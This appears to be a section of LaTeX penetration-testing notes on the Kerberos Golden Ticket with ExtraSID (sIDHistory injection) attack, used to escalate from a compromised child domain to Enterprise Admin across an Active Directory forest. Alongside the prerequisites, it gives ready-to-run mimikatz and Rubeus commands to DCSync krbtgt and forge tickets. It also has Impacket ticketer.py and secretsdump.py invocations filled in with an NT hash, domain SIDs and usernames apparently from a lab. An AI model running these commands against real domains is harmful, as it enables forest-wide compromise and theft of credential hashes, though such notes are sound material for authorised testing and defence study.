
\subsection{Golden Ticket with ExtraSID Attack}
\label{kerberos:golden-extra-sid-ticket}

The \href{https://attack.mitre.org/techniques/T1134/005/}{sIDHistory injection} attack consist in injecting harvested or well-known SID values (administrator SID) inside the sIDHistory of a controlled account since the SIDs of the sIDHistory are added to the \emph{acces token}~\ref{win:access-token}

The {\bf SID history} is a property of a {\bf user} or {\bf group object} that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform \emph{DCSync}~\ref{kerberos:DCSync} and create a \emph{Golden Ticket}~\ref{kerberos:golden-ticker} or a Kerberos ticket-granting ticket (TGT) which will allow for us to authenticate as any account in the domain of our choosing for further persistence.


 If the \emph{sIDHistory} of a controled user in a child domain is set to \emph{Enterprise Admins group} (which only exists in the parent domain), the user is treated as a member of this group, which allows for administrative access to the entire forest. 

 Leverage the \emph{SIDHistory} to grant an account (or  non-existent account) \emph{Enterprise Admin} rights by modifying this attribute to contain the \emph{SID for the Enterprise Admins group}, will give full access to the parent domain without actually being part of the group.

The requierements To perform this attack after compromising a child domain,
are:
\begin{itemize}
    \item Same As Golden
    \item plus:
        \begin{itemize}
            \item if in the same forest either:
                \begin{itemize}
                    \item 
                        (no SIDFiltering): The SID of the Enterprise Admins group (519) of the root domain
                    \item (SIDFiletering): the SID on domain controllers (516) group of the root domain (\verb+user <dc_name>$ id <dc_rid> group:516 sids:<root_domain_sid>-<rid|516>+)
                \end{itemize}
            \item if cross forest + SID history (external)
                \begin{itemize}
                    \item THE SID of a group above RID 1000 
                \end{itemize}
        \end{itemize}
\end{itemize}

\subsubsection{On windows}

\begin{verbatim}
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<domain_netbios>\krbtgt" "exit"
\end{verbatim}


\begin{verbatim}
# Forge ticket 
mimikatz.exe "privilege::debug"  "kerberos::golden /user:<user> /id:<user_rid> /krbtgt:<krbtgt_nthash> /group:500,501,513,512,520,518 /sid:<src_domain_sid> /domain:<src_domain_fqdn> /sids:<dst_domain_sid>-<rid>  /ptt" "exit"
or
.\Rubeus.exe golden /user:<user> /ldap \
    /rc4:<krbtgt_nthash> \
    /sids:<dst_domain_sid>-<rid> 
    /nowrap /printcmd /ptt
\end{verbatim}


\subsubsection{From Linux}

\begin{verbatim}
ticketer.py \
    -nthash 9404def404bc198fd9830a3483869e78  \
    -domain-sid S-1-5-21-1416445593-394318334-2645530166 \
    -domain dev.admin.offshore.com \
    -extra-sid S-1-5-21-1216317506-3509444512-4230741538-519 \
    -user-id 11607 \
    jubeaz
\end{verbatim}

\begin{verbatim}
secretsdump.py -debug -k -no-pass -just-dc-ntlm \
    dev.admin.offshore.com/jubeaz@dc03.admin.offshore.com
\end{verbatim}


\subsubsection{raiseChild.py}
There is also a full automated script \verb+raiseChild.py+~\ref{tool:impacket:raiseChild}



